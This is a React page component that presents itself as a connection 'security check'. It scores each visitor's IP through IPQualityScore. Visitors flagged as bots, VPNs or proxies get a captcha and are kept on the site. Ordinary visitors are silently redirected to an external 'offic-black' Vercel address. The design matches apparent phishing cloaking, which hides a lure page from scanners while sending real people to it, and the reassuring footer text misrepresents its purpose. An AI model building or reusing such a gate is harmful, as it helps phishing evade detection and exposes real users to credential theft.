import { useEffect, useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

interface IPQSResponse {
  success: boolean;
  proxy: boolean;
  vpn: boolean;
  bot_status: boolean;
  fraud_score: number;
  message?: string;
}

const Verify = () => {
  const navigate = useNavigate();
  const [status, setStatus] = useState<'checking' | 'captcha' | 'redirecting'>('checking');
  const [error, setError] = useState<string>('');
  const [turnstileLoaded, setTurnstileLoaded] = useState(false);
  const turnstileRef = useRef<HTMLDivElement>(null);
  const widgetIdRef = useRef<string | null>(null);

  // Load Turnstile script
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
    script.async = true;
    script.defer = true;
    script.onload = () => setTurnstileLoaded(true);
    document.head.appendChild(script);

    return () => {
      const existingScript = document.querySelector('script[src="https://challenges.cloudflare.com/turnstile/v0/api.js"]');
      if (existingScript) {
        document.head.removeChild(existingScript);
      }
    };
  }, []);

  // Check IP with IPQS
  useEffect(() => {
    const checkIP = async () => {
      try {
        const IPQS_API_KEY = import.meta.env.VITE_IPQS_API_KEY;
        
        if (!IPQS_API_KEY) {
          setError('IPQS API key not configured');
          return;
        }

        // Get user's IP first
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipResponse.json();

        // Check with IPQS using CORS proxy
        const ipqsUrl = `https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${ip}?strictness=0&allow_public_access_points=true`;
        const response = await fetch(
          `https://corsproxy.io/?${encodeURIComponent(ipqsUrl)}`
        );
        
        const data: IPQSResponse = await response.json();

        if (!data.success) {
          setError(data.message || 'Failed to verify IP');
          return;
        }

        // Check if proxy, VPN, or bot detected, or high fraud score
        const isSuspicious = data.proxy || data.vpn || data.bot_status || data.fraud_score > 75;

        if (isSuspicious) {
          // Show captcha
          setStatus('captcha');
        } else {
          // Clean traffic - redirect to external site
          setStatus('redirecting');
          setTimeout(() => {
            window.location.href = 'https://offic-black.vercel.app';
          }, 1500);
        }
      } catch (err) {
        console.error('Error checking IP:', err);
        setError('Failed to verify connection. Please try again.');
      }
    };

    checkIP();
  }, []);

  // Handle Turnstile rendering and success
  useEffect(() => {
    if (status === 'captcha' && turnstileLoaded && turnstileRef.current && !widgetIdRef.current) {
      // Attach callback to window for Turnstile
      (window as any).onTurnstileSuccess = () => {
        setStatus('redirecting');
        setTimeout(() => {
          navigate('/');
        }, 1000);
      };

      // Explicitly render Turnstile widget
      try {
        const widgetId = (window as any).turnstile.render(turnstileRef.current, {
          sitekey: import.meta.env.VITE_TURNSTILE_SITE_KEY,
          callback: (window as any).onTurnstileSuccess,
          theme: 'light',
        });
        widgetIdRef.current = widgetId;
      } catch (err) {
        console.error('Failed to render Turnstile:', err);
        setError('Failed to load security challenge. Please refresh the page.');
      }
    }

    return () => {
      // Cleanup widget on unmount
      if (widgetIdRef.current && (window as any).turnstile) {
        try {
          (window as any).turnstile.remove(widgetIdRef.current);
          widgetIdRef.current = null;
        } catch (err) {
          console.error('Failed to remove Turnstile widget:', err);
        }
      }
    };
  }, [status, turnstileLoaded, navigate]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-gray-50 to-gray-100">
      <div className="max-w-md w-full mx-4">
        <div className="bg-white rounded-2xl shadow-xl p-8 space-y-6">
          {/* Header */}
          <div className="text-center">
            <div className="mx-auto w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mb-4">
              {status === 'checking' && (
                <svg className="animate-spin h-8 w-8 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              )}
              {status === 'captcha' && (
                <svg className="h-8 w-8 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
              )}
              {status === 'redirecting' && (
                <svg className="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              )}
            </div>
            <h1 className="text-2xl font-bold text-gray-900">
              {status === 'checking' && 'Verifying Connection'}
              {status === 'captcha' && 'Security Check'}
              {status === 'redirecting' && 'Verified!'}
            </h1>
            <p className="mt-2 text-gray-600">
              {status === 'checking' && 'Please wait while we verify your connection...'}
              {status === 'captcha' && 'Please complete the verification below'}
              {status === 'redirecting' && 'Redirecting you now...'}
            </p>
          </div>

          {/* Error Message */}
          {error && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4">
              <p className="text-red-800 text-sm">{error}</p>
            </div>
          )}

          {/* Turnstile Captcha */}
          {status === 'captcha' && turnstileLoaded && (
            <div className="flex justify-center">
              <div ref={turnstileRef}></div>
            </div>
          )}

          {/* Loading indicator for captcha */}
          {status === 'captcha' && !turnstileLoaded && (
            <div className="flex justify-center">
              <div className="animate-pulse bg-gray-200 h-16 w-64 rounded"></div>
            </div>
          )}

          {/* Redirecting spinner */}
          {status === 'redirecting' && (
            <div className="flex justify-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
            </div>
          )}
        </div>

        {/* Footer info */}
        <p className="mt-6 text-center text-sm text-gray-500">
          This security check helps protect our service from automated abuse.
        </p>
      </div>
    </div>
  );
};

export default Verify;
